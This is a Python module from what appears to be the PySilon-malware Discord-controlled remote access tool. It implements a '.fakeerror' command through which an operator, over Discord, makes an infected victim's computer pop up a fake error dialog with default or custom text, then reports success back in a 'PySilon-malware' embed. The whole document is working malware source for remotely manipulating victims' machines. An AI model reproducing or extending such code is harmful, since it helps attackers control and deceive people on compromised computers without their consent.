#<imports>
from tkinter import messagebox
#</imports>


@client.command(name="fakeerror")
async def fake_error(ctx, *, args=None):
    await ctx.message.delete()

    if args is None or args.strip() == '':
        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .fakeerror default | custom [message]```',colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
    else:
        parts = args.split()
        command = parts[0]

        if command == 'default':
            try:
                error_msg = "Something went wrong"
                messagebox.showerror("Error", error_msg, icon='error')
                embed = discord.Embed(title="🟢 Success",description=f'```Fake error has been triggered.```',colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            except:
                embed = discord.Embed(title="🔴 Hold on!",description=f'```Something went wrong during the trigger```',colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        elif command == 'custom':
            if len(parts) < 2:
                embed = discord.Embed(title="📛 Error",description=f'```No custom message provided```',colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            else:
                custom_error_message = ' '.join(parts[1:])
                try:
                    messagebox.showerror("Error", custom_error_message, icon='error')
                    embed = discord.Embed(title="🟢 Success",description=f'```Fake error with custom message has been triggered.```',colour=discord.Colour.green()
                    )
                    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                except:
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```Something went wrong during the trigger```',colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error",description=f'```Invalid option. Choose default or custom```',colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
